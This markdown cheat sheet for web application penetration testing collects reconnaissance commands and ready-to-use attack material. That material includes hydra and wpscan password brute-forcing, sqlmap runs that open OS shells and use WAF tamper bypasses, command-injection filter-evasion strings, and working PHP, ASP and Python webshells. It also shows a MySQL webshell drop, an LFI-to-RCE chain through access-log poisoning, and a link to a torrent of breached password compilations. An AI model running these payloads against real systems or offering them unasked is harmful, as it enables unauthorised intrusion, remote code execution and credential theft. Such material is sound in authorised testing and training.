# Web application pentest cheet sheet

## Passive reconissance

### DNS, Domain & IP informations

 - `host pentest-experts.com`
 - `whois pentest-experts.com`
 - `dnsrecon -d pentest-experts.com`
 - https://sitereport.netcraft.com
 - https://dnsdumpster.com

### Passiv portsacn results

 - https://shodan.io
 - https://search.censys.io

### Enumerating subdomains / emails via OSINT

 - `sublist3r -d pentest-experts.com`
 - `theHarvester -d pentest-experts.com -b all`
 - https://crt.sh
 - https://osint.sh

### Google dorks 

 - `site:pentest-experts.com` - all indexed urls, files of a speciffic site
 - `inurl:admin` - search for admin-panel
 - `intitle:admin` - search for admin-panel
 - `ext:(old | bak | inc)` - file extensions (which could potentially leak information)
 - `site:pentest-experts.com filetype:xml` - filetype work only in comb. with site
 - `site:*.pentest-experts.com` - all subdomains
 - `cache:pentest-experts.com` - display cached version
 - `info:pentest-experts.com` - informatio about the webpage

### Older versions of websites

 - https://web.archive.org

### Leaked passwords

 - https://downloadtorrentfile.com/hash/af2879db0fab2a32ba38d0491aa8fea5e29d3678?name=CompilationOfManyBreaches.7z
 - Searches in google and the darknet search engines

## Active reconissance

### WAF idenfification

 - `wafw00f pentest-experts.com`
 - `wafw00f -a pentest-experts.com` - find all possible WAFs

### Informations about used technologies

 - `buildwith` - Browser plugin
 - `wappalyzer` - Browser plugin
 - `whatweb pentest-experts.com`

### Interesting files on a website

 - `robots.txt` - files & folders which sould not be indexed
 - `sitemap.xml` - list of all URLs which sould be indexed
 - `urllist.txt` - list of all URLs which sould be indexed

### Active DNS reconissance

 - `dnsenum --enum pentest-experts.com`  
   (enumeration using zone transfer and public sources)
 - `dnsenum --enum inlanefreight.com -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -r`  
   (recursive enumeration using a wordlist)
 - `dig axfr @nsztm1.digi.ninja zonetransfer.me`   
 Zonetransfer from `nsztm1.digi.ninja` for `zonetransfer.me`
 - `fierce --domain pentest-experts.com`
 - `nmap -Pn -sV -O -sC -T0 -p- 1.2.3.4`

### Active Subdomain / VHosts brutforcing

 - `gobuster vhost -u https://pentest-experts.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain`  
   (use `-k` to ignore invalid SSL certificates or `-o scan.log` to output to a file)
 - `ffuf -u "https://FUZZ.pentest-experts.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -v`  
   Need to resolve the IP via DNS, use e.g. `-mc 200,301,302` to filter for speciffic HTTP response code
 - `ffuf -u "https://pentest-experts.com" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -H 'Host: FUZZ.pentest-experts.com' -v`  
   Need only to resolve the main domain (`pentest-experts.com`) and fuzz for vhosts added to the Webserver configuartion but not added as a A / AAAA record to the DNS. This is done via the `Host` header. User `-fs 123` to filter speciffic response sizes out in case the response code would not help.

### Active CMS enumeration / attack

 - `wpscan --url https://pentest-experts.com/wp/`
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate u`  
   (enumerate users)
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate vp --api-token YOUR_TOKEN`  
   (Vuln. plugins, need an API topen for wpscan)
 - `wpscan --url https://pentest-experts.com/wp/ --enumerate vt --api-token YOUR_TOKEN`  
   (Vuln. themes, need an API topen for wpscan)
 - `wpscan --url https://pentest-experts.com/wp/ -U admin -P /usr/share/wordlists/rockyou.txt`  
   (Bruteforce of password)
 - `cmsmap.py https://pentest-experts.com/wp/ -f W`  
   (`W` for WordPress, `J` for Joomla, `D` for Drupal)

### The `.well-known` URIs

The `.well-known` standard, serves as a standardized directory within a website's root domain with a treasure-trove of information - see: https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml 

e.g.:

 - `https://pentest-experts.com/.well-known/openid-configuration`  
   JSON document containing metadata about OpenID endpoints, supported authentication methods, token issuance, etc.

### Working with services

FTP

 - `ftp 1.2.3.4`
 - **ftp>** `ls`
 - **ftp>** `cd secret`
 - **ftp>** `get flag.txt`
 - **ftp>** `put linsploit.sh`
 - **ftp>** `bye`
 - `nmap 1.2.3.4 -p 21 --script ftp-brute --script-args userdb=/home/mark/users.txt`
 - `nmap 1.2.3.4 -p 21 --script ftp-anon`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 ftp`

SSH

 - `ssh root@1.2.3.4`
 - `nc 1.2.3.4 22` (Get banner)
 - `nmap 1.2.3.4 -p 22 --script ssh2-enum-algos`
 - `nmap 1.2.3.4 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
 - `nmap 1.2.3.4 -p 22 --script ssh-auth-methods --script-args "ssh.user=test"`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 ssh`
 - `nmap 1.2.3.4 -p 22 --script ftp-brute --script-args userdb=/home/mark/users.txt`

HTTP

 - `curl -v 1.2.3.4`
 - `curl -i -X OPTIONS 1.2.3.4`
 - `curl https://pentest-experts.com/upload/ --upload-file webshell.php`
 - `httpx https://pentest-experts.com`
 - `httpx --no-verify https://pentest-experts.com`
 - `dirb https://pentest-experts.com`
 - `links https://pentest-experts.com`
 - `lynx https://pentest-experts.com`
 - `nmap -p 443 1.2.3.4 --script ssl-enum-ciphers`
 - `nmap -p 443 1.2.3.4 --script ssl-heartbleed`
 - `nmap -p 80 1.2.3.4 --script http-enum`
 - `nmap -p 80 1.2.3.4 --script http-headers`
 - `nmap -p 80 1.2.3.4 --script http-methods`
 - `nmap -p 80 1.2.3.4 --script http-methods --script-args "http-methods.url=/webdav/"`
 - **msf5>** `use auxiliary/scanner/http/http_version`
 - **msf5>** `use auxiliary/scanner/http/brute_dirs`
 - `gobuster dir -u https://pentest-experts.com/ -w /usr/share/dirb/wordlists/common.txt -x zip,bz2,tar,gz,tgz,tar.bz2,tar.gz,old,bak,inc,ini,xml,txt,yaml,yml,conf,cnf,config,json -k -b 404,401`  
 Search for directries (`dir`) and files (`-x ...`) with the wordlist (`-w ...`) by accepting also self-signed SSL certificates(`-k`) and blacklisting 404 and 401 errorcodes (`-b ...`) as invalid URLs.
 - `ffuf -w /usr/share/dirb/wordlists/common.txt:FUZZ -u http://83.136.253.173:51317/FUZZ -recursion -recursion-depth 1 -e .asp,.aspx,.bat,.c,.cfm,.cgi,.css,.com,.dll,.exe,.hta,.htm,.html,.inc,.jhtml,.js,.jsa,.jsp,.log,.mdb,.nsf,.pcap,.php,.php2,.php3,.php4,.php5,.php6,.php7,.phps,.pht,.phtml,.pl,.phar,.reg,.sh,.shtml,.sql,.swf,.txt,.xml -v`  
   Recursive fuzzing of directory and filename with different extensions.
 - `ffuf -u "https://pentest-experts.com/index.php?FUZZ=val" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -H 'Host: FUZZ.pentest-experts.com' -v`  
   Fuzzing of GET / POST parameters or values.  
   Use `-X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'` for POST parameter or value fuzzing.  
 - **Use browser-plugins like the `UA spoofer` to fake a older Browser like IE and test if a different version of the website is served!!! Maybe there is a fallback to an oder an vuln. version of the site...**
 
MySQL

 - `mysql -h 1.2.3.4`
 - `mysql -h 1.2.3.4 -u user`
 - `mysql -h 1.2.3.4 -u user -p`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_writeable_dirs`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_hashdump`
 - **msf5>** `use auxiliary/scanner/mysql/mysql_login`
 - **mysql [dvwa]>** `select load_file('/etc/passwd')`
 - `nmap -p 3306 1.2.3.4 --script mysql-empty-password`
 - `nmap -p 3306 1.2.3.4 --script mysql-info`
 - `nmap -p 3306 1.2.3.4 --script mysql-audit --script-args "mysqluser=root,mysqlpass=password1"`
 - `nmap -p 3306 1.2.3.4 --script mysql-variables --script-args "mysql-audit.username=root, mysql-audit.password=password1, mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit"`
 - `nmap -p 3306 1.2.3.4 --script mysql-dump-hashes --script-args "username=root, password=password1"`
 - `hydra -L users.txt -P rockyou.txt 1.2.3.4 mysql`

MS SQL

 - `nmap -p 3306 1.2.3.4 --script ms-sql-info`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-empty-password`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-ntlm-info --script-args "mssql.instance-port=1433"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-ntlm-info --script-args "mssql.instance-port=1433"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-dump-hashes --script-args "mssql.username=admin, mssql.password=password1"`
 - `nmap -p 3306 1.2.3.4 --script ms-sql-xp-cmdshell --script-args "mssql.username=admin, mssql.password=password1, ms-sql-xp-cmdshell.cmd='ipconfig /all'"`
 - **msf5>** `use auxiliary/scanner/mssql/mssql_login`
 - **msf5>** `use auxiliary/scanner/mssql/mssql_hashdump`
 - **msf5>** `use auxiliary/admin/mssql/mssql_exec`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum_sql_logins`
 - **msf5>** `use auxiliary/admin/mssql/mssql_enum_domain_accounts`

### Webserver security scanning

 - `BurpSuite Proxy`
 - `OWASP ZAP Proxy`
 - `nikto -h https://pentest-experts.com -o report.html -Format htm`

## Automate passive and active reconissance

 - `amass enum -d pentest-experts.com -passive -src -ip -dir ./outputfolder/`
 - `amass intel -whois -d pentest-experts.com -active -src -ip -dir ./outputfolder/`
 - `wap.py https://pentest-experts.com common.txt dns.txt`  
 see: https://github.com/mark-b1980/WebsiteAutoRecon

 ## XSS

 - `xsser --gtk`
 - `xsser --url "https://pentest-experts.com/index.php?page=dns-lookup.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --cookie "PHPSESSID=gp9j95cv3q1tki2nsg8mml4lt6;showhints=0" --drop-cookie --auto --reverse-check -s`
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

**Prevention tips:**

 - Using XSS prevention headers.
 - Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
 - Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
 - Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

## SQLi / NoSQLi

**SQLi**

You can change `--risk` to try riskier statements but some SQLi injection points like an `UPDATE` statement can overwrite all data in a table when combined with a `OR`-based payload (`--risk 3`). The setting `--risk 2` adds heavy time-based queries.

 - `sqlmap -r request.txt --level 5 --risk 3 -p vulnerable_field --random-agent --dbs`  
   Use captured request from ZAP / BurpSuite and use a random user agent string instrad of the sqlmap UA sting as many WAFs drop requests from sqlmap.
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search --dbs`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search -D db_name --tables`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --level 5 --risk 1 -p search -D db_name -T table_name --dump`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/search/xxx*" --cookie="SID=123456ABC" --level 5 --risk 1 --dbs`  
   Explot the serach-value `xxx` in "nice" URLs - `*` can be used an marker in any field like cookies or GET-parameters, not only in "nice" URLs.
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --prefix "'" --suffix " -- "`  
   Specify suffix to start the SQLi and suffix to comment the left-overs out
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --technique U`  
   Specify query type - here UNION queries
 - `` 
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --os-pwn`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --os-shell`
 - `sqlmap --dbms=mysql -u "https://pentest-experts.com/?search=xxx" --cookie="SID=123456ABC" --sql-shell`
 - `sqlmap -r request.txt --parse-errors --dbs`  
   Parse SQL errors and outpit them to the console
 - `sqlmap -r request.txt --code=200 --dbs`  
   Use HTTP response code 200 to detect `True` - useful in case a `False` response would result in a different status code (e.g. 500 server error or 302 redicrection).
 - `sqlmap -r request.txt --string="Welcome" --dbs`  
   Detect `True` / `False` responses based on the presence / absence of a string.
 - `sqlmap -r request.txt --union-cols=5 --dbs`  
   Specify the number of coulumns for a unin based query manually.
 - `sqlmap -r request.txt --passwords`  
   Get the password-hashes from the users within the DBMS itself.
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

**Manual prefix testing**

 1. Testing `https://pentest-experts.com/case6.php?col=id'` = No output = Not sure if it worked
 2. Testing `https://pentest-experts.com/case6.php?col=id"` = No output = Not sure if it worked
 3. Testing `https://pentest-experts.com/case6.php?col=id%60` - SQL Error = Confirmed working but prefix not correct
 4. Testing `https://pentest-experts.com/case6.php?col=id%60+--+` - SQL Error = Confirmed working but prefix not correct, trying to add `)`
 5. Testing `https://pentest-experts.com/case6.php?col=id%60)+--+` - SQL Error = Confirmed working but prefix not correct, trying to add `)`
 6. Testing `https://pentest-experts.com/case6.php?col=id%60))+--+` - Some data output = Confirmed working, prefix correct, using `--prefix="%60))"` in SQLmap

 In case there is no error, I would try `')`, `'))`, ... and `")`, `"))`, ...

**Bypassing defense mechanisms**

 - `sqlmap -r request.txt --random-agent --dbs`  
   User random user agent to overcome UA blocking
 - `sqlmap -r request.txt --csrf-token="csrf-token-parameter-name" --dbs`  
   Read and use CSRF token for each request
 - `sqlmap -r request.txt --randomize="parameter-name-for-random-value" --dbs`  
   Calculate a new random message for each request 
 - `sqlmap -r request.txt --eval="import hashlib; hash_parameter=hashlib.md5(msg).hexdigest()" --dbs`  
   Calculate hash for each request (using Python code)
 - `sqlmap -r request.txt --proxy="socks4://127.0.0.1:9050" --dbs`  
   Use TOR proxy to overcome IP address blocking
 - `sqlmap -r request.txt --chunked --dbs`  
   Send payloads in multiple HTTP packages as chunks to avoid detection
 - `sqlmap -r request.txt --hpp --dbs`  
   Split payloads in multiple instance of the same parameter (e.g.: `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`)  
   Works only if a target concatinate those like ASP does!
 - `sqlmap -r request.txt --tamper=script1,script2,... --dbs`  
   Using pre-defined tamper scripts to bypass WAF/IPS solutions:
    - `0eunion`  
      Replaces instances of `UNION` with `e0UNION`
    - `base64encode`  
      Base64-encodes all characters in a given payload
    - `between`  
      Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`
    - `commalesslimit`  
      Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart
    - `equaltolike`  
      Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart
    - `halfversionedmorekeywords`  
      Adds (MySQL) versioned comment before each keyword
    - `modsecurityversioned`  
      Embraces complete query with (MySQL) versioned comment
    - `modsecurityzeroversioned`  
      Embraces complete query with (MySQL) zero-versioned comment
    - `percentage`  
      Adds a percentage sign (`%`) in front of each character (e.g. `SELECT` -> `%S%E%L%E%C%T`)
    - `plus2concat`  
      Replaces plus operator (`+`) with (MsSQL) function `CONCAT()` counterpart
    - `randomcase`  
      Replaces each keyword character with random case value (e.g. `SELECT` -> `SEleCt`)
    - `space2comment`  
      Replaces space character with comments `/
    - `space2dash`  
      Replaces space character with a dash comment (`--`) followed by a random string and a new line (`\n`)
    - `space2hash`  
      Replaces (MySQL) instances of space character with a pound character (`#`) followed by a random string and a new line (`\n`)
    - `space2mssqlblank`  
      Replaces (MsSQL) instances of space character with a random blank character from a valid set of alternate characters
    - `space2plus`  
      Replaces space character with plus (`+`)
    - `space2randomblank`  
      Replaces space character with a random blank character from a valid set of alternate characters
    - `symboliclogical`  
      Replaces `AND` and `OR` logical operators with their symbolic counterparts (`&&` and `||`)
    - `versionedkeywords`  
      Encloses each non-function keyword with (MySQL) versioned comment
    - `versionedmorekeywords`  
      Encloses each keyword with (MySQL) versioned comment  

**NoSQLi**
 
 - `NoSQLMap` (... then follow the assistant)
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection 

## HTTP method/verb tampering

... Changing the HTTP methods (`GET`, `POST`, `PUT`, ...) to provoke different behaviour of the application.

 - `curl -v -X GET 1.2.3.4`
 - `curl -v -X HEAD 1.2.3.4`
 - `curl -v -X POST 1.2.3.4`
 - `curl -v -X POST --data "param1=value1&param2=value2" 1.2.3.4`
 - `curl https://pentest-experts.com/upload/ --upload-file webshell.php`
 - `nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/upload/,/protected/index.php}' 1.2.3.4`

## HTTP basic / digest auth:

**BASIC authentication**

 - `hydra -l admin -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`  
 use `-s` to specify a port (e.g. `-s 8080`)
 - `hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`

**DIGEST authentication**

This is a challenge response auth. and much more secure / difficult to attack then BASIC auth.

 - `hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/1000_common_passwords.txt -f 1.2.3.4 http-get /admin/`  
Hydra can detect the type of auth. and that's why the same command can attack BASIC and DIGEST auth.

## Command injection

 - `commix --url="https://pentest-experts.com/ping.php?ip=INJECT_HERE"`

**Injection characters**

```
CHAR   URL ENC.    DESCRIPTION
-----  ----------  ----------------------------
 ;     %3b         (Concatination of commands)
 \n    %0a         (Newline)
 &     %26         (Background)
 |     %7c         (Pipe)
 &&    %26%26      (Logical AND)
 ||    %7c%7c      (Logical OR)
 ``    %60%60      (Subshell)
 $()   %24%28%29   (Subshell)
```

**Bypassing space blacklist**

 - Encoding the space as `\x20`
 - Using a tab (`%09`)
 - Using `${IFS}` - a Linux environment variable containing the CLI argument speparator (usually the space)
 - Using the input redirection operator - e.g.: `cat</etc/passwd`
 - Using the bash brace expantion syntax - e.g.: `{cat,/etc/passwd}`

**Bypassing `\` and `/` blacklisting**

 - Using `${PATH:0:1}` in Linux (Substring)
 - Using `$(tr '!-}' '"-~'<<<[)` in Linux (Character shifting)
 - Using `$env:HOMEPATH[0]` in Windows Powershell
 - Using `%HOMEPATH:~6,-5%` in Windows CMD (`-5%` is the length of the username)

**Bypassing `;` blacklisting**

 - Using `${LS_COLORS:10:1}` in Linux (Substring)
 - Using `$(tr '!-}' '"-~'<<<:)` in Linux (Character shifting)

**Bypassing `|` blacklisting**

 - Using `<<<` and a subshell in Linux - e.g.: `grep${IFS}root<<<$(cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd)`

 **Bypassing command blacklists**

 - Adding aquotation marks `w"h"o"am"i` or `w'h'o'am'i`
 - Adding the positional character operator `who$@ami` (Linux only)
 - Adding the `\` character `w\ho\ami` (Linux only)
 - Adding the `^` character - e.g.: `who^ami` (Windows only)
 - Using mixed case `wHoAmI` (Windows only)
 - Using mixed case `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` or `$(a="WhOaMi";printf %s "${a,,}")` (Linux only)
 - Using reversed commands - e.g.: `$(rev<<<'imaohw')` (Linux only)
 - Using reversed commands - e.g.: `iex "$('imaohw'[-1..-20] -join '')"` (Windows Powershell only)
 - Using encoding - e.g. Base64: `bash<<<$(base64 -d<<<d2hvYW1p)` (Linux Only)
 - Using encoding - e.g. Base64: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` (Windows Powershell only)  
   ❗❗❗ Powershell use the characterset UTF-16LE and not UTF-8 ❗❗❗  
   Create the correct Base64 string on Linux: `echo -n "whoami" | iconv -f utf-8 -t utf-16le | base64`

For more see: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses

Useful tools:

 - https://github.com/Bashfuscator/Bashfuscator
 - https://github.com/danielbohannon/Invoke-DOSfuscation

## Directory travesal

 - Overcome filtering: 
   1. use `....//` to overcome removal of `../` from parameters

## Local File Inclusion (LFI) / Remote File Inclusion (RFI)

 - `https://pentest-experts.com/read.php?file=../../../../../etc/passwd` (local)
 - `https://pentest-experts.com/read.php?file=https://pentest-experts.com/sypps.txt` (remote)

## Webshells

**PHP**

```php
<?php echo system($_GET["c"]) ?>
```

Usage: `https://hacked.box/upload/shell.php?c=whoami`

**ASP**

```asp
<% eval request('c') %>
```

Usage: `https://hacked.box/upload/shell.asp?c=whoami`

**Python**

```python
#!/usr/bin/env python
import cgi
import cgitb
import subprocess

cgitb.enable()

print("Content-Type: text/html")
print()

fs = cgi.FieldStorage()
try:
    cmd = fs['c'].value.strip()

    p = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p.wait()
    out, err = p.communicate()
    out = "<pre>" + out.decode("UTF-8") + "<hr>" + err.decode("UTF-8") + "<pre>"

except KeyError:
    out = "Use <pre>?c=[command]</pre> to execute a command!"
  
except:
    out = "Unknown error"

print(out)
```

Usage: `https://hacked.box/upload/shell.py?c=whoami`

## Misc. techniques

### MySQL access to remote code execution (RCE)

 - mysql> `SELECT '<?php echo system($_GET["c"]) ?>' INTO OUTFILE '/var/www/html/upload/shell.php' FROM mysql.user LIMIT 1`

### Execute php-shell on NGINX after upload with wrong file-extension

 - Given a PHP webshell was uploaded as shell.png on an NGINX server, the script can be run in PHP conext by adding `/shell.php&c=pwd` after the filename - a full URL-example would be:  
`https://pentest-experts.com/upload/shell.png/shell.php?c=pwd`

### Pass filter with PHPx fileextention

 - In case `.php` files are not allowed to be uploaded or not executed, try `.php5`, `.php7`, `.phtml`, etc.

### Wordpress manual enumration

**Version:**

 - Check WP meta-tag with the name `generator` - e.g.:  
`<meta name="generator" content="WordPress 4.4" />`
 - Check `readme.html`, `readme.txt`, `changelog.txt`, `license.txt`, ...
 - Inspect HTTP response-headers for `X-Powered-By` line
 - Check for version-info on the login-page (`wp-login.php`)
 - Check REST-API (usually under `https://site.com/wp-json/`)
 - Analyze JS- and CSS-files for version information - e.g.:  
`https://site.com/wp-embed.min.js?ver=4.4`
 - Inspect the `generator`-tag in RSS feed - e.g.:  
`https://site.com/?feed=rss2`  
There you will find:  
`<generator>https://wordpress.org/?v=4.4</generator>`

**Users:**

 - `curl -s -I -X GET https://site.com/?author=1` - Look for response code `200`
 - `curl https://site.com/wp-json/wp/v2/users` - via API

### SOAP Webservice

 - Check if you can find the `WSDL` file (*= WS description*)
 - Try to identify not documented methods by the try & error method

**Pay attention to the `SOAPAction` header:**

If you see folloging lines in **WSDL**:

```
...
<soap:operation soapAction="urn:ws-user-account#getAdminInfo" style="rpc"/>
<input> 
  <soap:body use="encoded" namesapce="urn:ws-user-account" encodeStyle="http://schemas.xmlsoap.org/soap/encoding/"/>
</input>
...
```
You need to use the following header-line:

`SOAPAction: urn:ws-user-account#getAdminInfo`

Then get rid of all data within the `<soapenv:Envelope ...>`-tag and only use an empty tag in the body:

```
<soapenv:Envelope ...>
</soapenv:Envelope>
```

Some SOAP-methods have to be called that way or they don't work!

### Local file inclusion (LFI) to remote code execution (RCE)

 1. Browse some URL with BrupSuite or ZAP and change the `User-Agent` field in the header to:  
`<?php echo system($_GET["c"]); ?>`
 2. Use the **access.log** to write a new shell to `/tmp`:  
`https://pentest-experts.com/read.php?file=../../../../../var/log/apache2/access.log&c=echo+'<?php+echo+system($_GET["c"]);+?>'>/tmp/s.php`
 3. Utilize the new shell:  
`https://pentest-experts.com/read.php?file=../../../../../tmp/s.php&c=ls+-l+/var/www/html/`

## Linux privilege escalation

 - https://roriwa.github.io/pentest/tools/LinPEAS/
 - https://gtfobins.github.io/

## Useful links

 - https://github.com/swisskyrepo/PayloadsAllTheThings
